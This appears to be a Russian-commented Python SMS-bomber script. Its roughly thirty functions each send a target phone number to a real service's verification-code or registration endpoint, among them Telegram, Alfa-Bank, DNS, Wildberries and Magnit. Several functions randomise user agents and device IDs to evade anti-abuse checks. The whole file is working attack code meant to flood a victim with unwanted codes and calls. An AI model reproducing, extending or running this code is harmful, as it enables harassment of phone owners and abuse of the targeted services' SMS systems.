# Post запросы:
from requests import post
from user_agent import generate_user_agent
from random import randint
import time
from fake_useragent import UserAgent

def mv(number,n=1):
    for _ in range(n):
        r = post('https://mv.com.ru/api/v1/send-code', data={'phone': f"{number}"})
        if r.status_code == 200:
            return '✅ Мир Возможностей отправлено'
        else:
            return '⚠️ Мир Возможностей не отправлено'
        time.sleep(1)

def dns(number,n=1,is_call =0):
    for i in range(n):
        r = post("https://www.dns-shop.ru/auth/auth/fast-authorization/",
                 data={"FastAuthorizationLoginLoadForm[login]:": f"{number}",
                       "FastAuthorizationLoginLoadForm[token]": "",
                       "FastAuthorizationLoginLoadForm[isPhoneCall]": is_call})
        if r.status_code == 200:
            return '✅ DNS отправлено'
        else:
            return '⚠️ DNS не отправлено'
        if i != n-1:
            time.sleep(30)

def sm_center(number,n=1):
    f_number = format_phone(number, "+# (###) ### ## ##")
    for _ in range(n):
        r = post('https://api.sm-center.ru/vremya/Auth/SendCheckCode',
                 json={"phone": f_number})
        if r.status_code == 200:
            return '✅ Наш дом отправлено'
        else:
            return '⚠️ Наш дом не отправлено '

def citilink(number,n=1):
    for _ in range(n):
        r = post('https://www.citilink.ru/registration/confirm/phone/+' + number + '/')
        if r.status_code == 200:
            return '✅ Ситилинк отправлено'
        else:
            return '⚠️ Ситилинк не отправлено'


def gorpay(number,n=1):
    for _ in range(n):
        r = post('https://api.gorpay.online/profile/Register/SendSmsCode2',
                 data={'PhoneNumber': number, 'SmsCodeReason': 'Registration'})
        if r.status_code == 200:
            return '✅ Регистрация Gorpay отправлено'
        else:
           return '⚠️ Регистрация Gorpay не отправлено'
        r = post('https://api.gorpay.online/profile/Register/SendOtpCode2',
                 data={'PhoneNumber': number, 'OtpCodeReason': 'ResetPassword', 'OtpProviderType': 'Sms'})
        if r.status_code == 200:
            return '✅ Востановление пароля Gorpay отправлено'
        else:
            return '⚠️ Востановление пароля Gorpay не отправлено'


def moe_online(number,n=1):
    for _ in range(n):
        r = post('https://moe-online.ru/register',
                 data={'number_phone': number,
                       'password': '123456', 'approv': True,
                       'name': 'WEFWEF', '_method': 'POST'})
        if r.status_code == 200:
            return '✅ moe-online отправлено'
        else:
            return '⚠️ moe-online не отправлено'


def avon(number,n=1):
    f_number = format_phone(number, "+###########")
    for _ in range(n):
        r = post('https://avon.ru/api/authentication_code', json={'phone': f_number, 'channel': 'SMS'})
        if r.status_code == 200:
            return '✅ Avon отправлено'
        else:
            return '⚠️ Avon не отправлено'


def alfabank(number,n=1):
    for _ in range(n):
        r = post('https://alfabank.ru/api/v1/form-sender-dc/v2/applications',
                 json={'cardId': 'RR', 'packageId': 'T04', 'contractId': 'PDRR', 'email': 'ch@ya.ru',
                       'embossingName': 'BB AA', 'firstName': 'Бб', 'lastName': 'Аа', 'middleName': 'Вв',
                       'passportBirthDate': '2000-01-01', 'mobilePhone': number[-10:], 'sex': 'm',
                       'sopdConfirmed': True, 'additionalServices': [], 'abTest': '',
                       'platformId': 'alfaonline_unauth_dc_newp'},
                 headers={'referer': 'https://alfabank.ru/lp/retail/debit/promo/dcnewclients/'})
        if r.status_code == 200:
            return '✅ Alpha-Bank отправлено'
        else:
            return '⚠️ Alpha-Bank не отправлено'


def zaymer(number,n=1):
    for _ in range(n):
        r = post('https://www.zaymer.ru/api/v3/registration/otp', json={"phone": int(number)})
        if r.status_code == 200:
            return '✅ Займер отправлено'
        else:
            return '⚠️ Займер не отправлено'


def lenta(number,n=1):
    for _ in range(n):
        headers = {'User-Agent': generate_user_agent(), "DeviceID": "3ea24583-84da-1bd8-005d-2b9f11bf0df3",
                   "X-Platform": "omniweb", "X-Retail-Brand": "lo"}
        r = post('https://lenta.com/api-gateway/v1/auth/code/send', json=
        {"acceptMarketingCommunications": True,
         "kfpKsid": "ca3289f7-4e00-4d2d-8d81-f2de9f0ad17e",
         "kfpVn": None,
         "phone": number}, headers=headers)
        if r.status_code == 200 and r.json().get('sent'):
            return '✅ Лента отправлено'
        else:
            return '⚠️ Лента не отправлено'


def wildberries(number,n=1):
    for _ in range(n):
        headers = {'User-Agent': generate_user_agent(),
                   "deviceid": f'site_{randint(10000, 99999)}as9232145d0ad4a88be4125350c'}
        r = post('https://wbx-auth.wildberries.ru/v2/code/wb-captcha',
                 json={"phone_number": number, "captcha_token": ''}, headers=headers)
        if r.status_code == 200:
            return '✅ Wildberries отправлено'
        else:
            return '⚠️ Wildberries не отправлено'


def kviku(number,n=1):
    f_number = format_phone(number, "+#-###-###-####")
    for _ in range(n):
        r = post('https://kviku.ru/cards/default/SendCodeApproveDocs', data={'phone': f_number})
        if r.status_code == 200 and r.json().get('status') == 'success':
            return '✅ kviku отправлено'
        else:
            return '⚠️ kviku не отправлено'


def telegram(number,n=1):
    f_number = format_phone(number, "+###########")
    for _ in range(n):
        r = post("https://my.telegram.org/auth/send_password", data={"phone": f_number})
        if r.status_code == 200 and r.text != 'Sorry, too many tries. Please try again later.':
            return '✅ Telegram отправлено'
        else:
            return '⚠️ Telegram не отправлено'


def mm(number,n =1):
    for _ in range(n):
        r = post('https://api.business.kazanexpress.ru/api/restore', json={"login": number[1:]})
        if r.status_code == 200 and r.text:
            return '✅ Магнит Маркет отправлено'
        else:
            return '⚠️ Магнит Маркет не отправлено'


        
ua = UserAgent()
 
 
def rossko(number, n=1):
    formatted = f'+7 {number[1:4]} {number[4:7]}-{number[7:9]}-{number[9:11]}'
    for _ in range(n):
        r = post(
            'https://rossko.ru/customer/auth/',
            headers={
                'User-Agent': ua.random,
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://rossko.ru',
                'Referer': 'https://rossko.ru/',
            },
            data={'action': 'registerByPhone', 'realPhone': formatted}
        )
        if r.status_code == 200:
            return '✅ Rossko отправлено'
        else:
            return '⚠️ Rossko не отправлено'
        time.sleep(1)
 
 
def apteka(number, n=1):
    formatted = f'+7 ({number[1:4]}) {number[4:7]}-{number[7:9]}-{number[9:11]}'
    for _ in range(n):
        r = post(
            'https://api.apteka.ru/Auth/Auth_Code',
            headers={
                'User-Agent': ua.android,
                'Accept': 'application/json',
                'Accept-Charset': 'UTF-8',
                'Content-Type': 'application/json',
                'device-id': '93f6c4ce7f48cd1b',
                'TZ': '-180',
                'Interface': 'Light',
            },
            json={'phone': formatted}
        )
        if r.status_code == 200:
            return '✅ Apteka.ru отправлено'
        else:
            return '⚠️ Apteka.ru не отправлено'
        time.sleep(1)
 
 
def magnit(number, n=1):
    for _ in range(n):
        r = post(
            'https://id.magnit.ru/v3/auth/signin',
            headers={
                'User-Agent': ua.android,
                'Accept': '*/*',
                'Accept-Language': 'ru',
                'Content-Type': 'application/json',
                'Origin': 'https://magnit.ru',
                'Referer': 'https://magnit.ru/',
            },
            json={'phone': number[1:], 'device_id': '66d050cd8fd4e15a'}
        )
        if r.status_code == 200:
            return '✅ Магнит отправлено'
        else:
            return '⚠️ Магнит не отправлено'
        time.sleep(1)
 
 
def webbankir(number, n=1):
    for _ in range(n):
        r = post(
            'https://ng-api.webbankir.com/user/v2/phone_verification',
            headers={
                'User-Agent': ua.random,
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json; charset=utf-8',
                'Origin': 'https://webbankir.com',
                'Referer': 'https://webbankir.com/',
            },
            json={'data': {'type': 'PhoneVerification', 'attributes': {
                'phone': number,
                'webbankirCrossId': '8879b668-4734-4a47-97f0-c9af8b2acf94'
            }}}
        )
        if r.status_code == 200:
            return '✅ Webbankir отправлено'
        else:
            return '⚠️ Webbankir не отправлено'
        time.sleep(1)
 
 
def chetire_lapy(number, n=1):
    for _ in range(n):
        r = post(
            'https://4lapy.ru/api/auth/newCode/',
            headers={
                'User-Agent': ua.random,
                'Accept': '*/*',
                'Content-Type': 'application/json; charset=utf-8',
                'Origin': 'https://4lapy.ru',
                'Referer': 'https://4lapy.ru/',
            },
            json={'phone': number}
        )
        if r.status_code == 200:
            return '✅ 4lapy отправлено'
        else:
            return '⚠️ 4lapy не отправлено'
        time.sleep(1)
 
 
def papajohns(number, n=1):
    for _ in range(n):
        r = post(
            'https://api.papajohns.ru/v2/user/signup-by-phone',
            headers={
                'User-Agent': ua.random,
                'Accept': 'application/json',
                'Content-Type': 'application/json; charset=utf-8',
                'Origin': 'https://papajohns.ru',
                'Referer': 'https://papajohns.ru/',
            },
            json={'phone': f'+{number}', 'platform': 'web', 'city_id': '192', 'lang': 'ru'}
        )
        if r.status_code == 200:
            return '✅ Papa Johns отправлено'
        else:
            return '⚠️ Papa Johns не отправлено'
        time.sleep(1)
 
 
def valta(number, n=1):
    formatted = f'+7 {number[1:4]} {number[4:7]}-{number[7:9]}-{number[9:11]}'
    for _ in range(n):
        r = post(
            'https://valta.ru/bitrix/services/main/ajax.php',
            params={'mode': 'class', 'c': 'citfact:register', 'action': 'sendSms'},
            headers={
                'User-Agent': ua.random,
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://valta.ru',
                'Referer': 'https://valta.ru/register/current_client/person/private_zooservis/',
            },
            data={'phone': formatted}
        )
        if r.status_code == 200:
            return '✅ Valta отправлено'
        else:
            return '⚠️ Valta не отправлено'
        time.sleep(1)
 
 
def ecco(number, n=1):
    formatted = f'+7 ({number[1:4]}) {number[4:7]}-{number[7:9]}-{number[9:11]}'
    for _ in range(n):
        r = post(
            'https://ecco.ru/ajax/ajax.php',
            headers={
                'User-Agent': ua.random,
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://ecco.ru',
                'Referer': 'https://ecco.ru/',
                'X-Requested-With': 'XMLHttpRequest',
            },
            data={
                'ajax_event': 'set_auth_type',
                'event': 'ajax',
                'show_description': '1',
                'show_register': '1',
                'auth_type': 'phone',
                'phone_login': formatted
            }
        )
        if r.status_code == 200:
            return '✅ ECCO отправлено'
        else:
            return '⚠️ ECCO не отправлено'
        time.sleep(1)
 
 
def viled(number, n=1):
    for _ in range(n):
        r = get(
            'https://api-prod.viled.kz/tizilimer/api/v1/users/sms',
            params={'phone': number},
            headers={
                'User-Agent': ua.random,
                'Accept': '*/*',
                'Accept-Language': 'ru',
                'Content-Type': 'application/json; charset=UTF-8',
                'Origin': 'https://viled.kz',
                'Referer': 'https://viled.kz/',
            }
        )
        if r.status_code == 200:
            return '✅ Viled.kz отправлено'
        else:
            return '⚠️ Viled.kz не отправлено'
        time.sleep(1)
 
 
def kino_1tv(number, n=1):
    for _ in range(n):
        r = get(
            'https://api.kino.1tv.ru/1.4/sendUserCode',
            params={'msisdn': number, 'mobile': 'false', 'client': 'web', 'referer': 'https://kino.1tv.ru/'},
            headers={
                'User-Agent': ua.random,
                'Accept': '*/*',
                'Origin': 'https://kino.1tv.ru',
                'Referer': 'https://kino.1tv.ru/',
            }
        )
        if r.status_code == 200:
            return '✅ Кино 1ТВ отправлено'
        else:
            return '⚠️ Кино 1ТВ не отправлено'
        time.sleep(1)
 
 
def dostavista(number, n=1):
    for _ in range(n):
        r = post(
            'https://dostavista.ru/user/send-sms',
            headers={
                'User-Agent': ua.random,
                'Accept': 'application/json',
                'Content-Type': 'application/json; charset=utf-8',
                'Origin': 'https://dostavista.ru',
                'Referer': 'https://dostavista.ru/',
            },
            json={'phone': number, 'source': 'signup'}
        )
        if r.status_code == 200:
            return '✅ Dostavista отправлено'
        else:
            return '⚠️ Dostavista не отправлено'
        time.sleep(1)
 
 
def lifemart(number, n=1):
    for _ in range(n):
        r = post(
            'https://api.lifemart.ru/api/user/register',
            headers={
                'User-Agent': 'LifeMart/286 CFNetwork/3860.200.71 Darwin/25.1.0',
                'Accept': '*/*',
                'Content-Type': 'application/json; charset=utf-8',
            },
            json={'verify_type': 'sms', 'phone': number[1:]}
        )
        if r.status_code == 200:
            return '✅ Lifemart отправлено'
        else:
            return '⚠️ Lifemart не отправлено'
        time.sleep(1)
 
 
def joy_money(number, n=1):
    for _ in range(n):
        r = post(
            'https://my.joy.money/client-interface/authorize',
            headers={
                'User-Agent': ua.random,
                'Content-Type': 'application/json; charset=utf-8',
                'Accept': 'application/json',
            },
            json={'phone': number, 'amount': '5500', 'days': '12'}
        )
        if r.status_code == 200:
            return '✅ Joy Money отправлено'
        else:
            return '⚠️ Joy Money не отправлено'
        time.sleep(1)
 
 
def svoefermerstvo(number, n=1):
    for _ in range(n):
        r = post(
            'https://svoefermerstvo.ru/api/ext/rshb-auth/send-verification-code-auth',
            headers={
                'User-Agent': ua.random,
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json; charset=utf-8',
                'Origin': 'https://svoefermerstvo.ru',
                'Referer': 'https://svoefermerstvo.ru/auth',
            },
            json={'login': f'+{number}'}
        )
        if r.status_code == 200:
            return '✅ Своё Фермерство отправлено'
        else:
            return '⚠️ Своё Фермерство не отправлено'
        time.sleep(1)
    

     



# Изменение формата номера
def format_phone(phone, phone_mask):
    phone_list = list(phone)
    for i in phone_list:
        phone_mask = phone_mask.replace("#", i, 1)
    return phone_mask
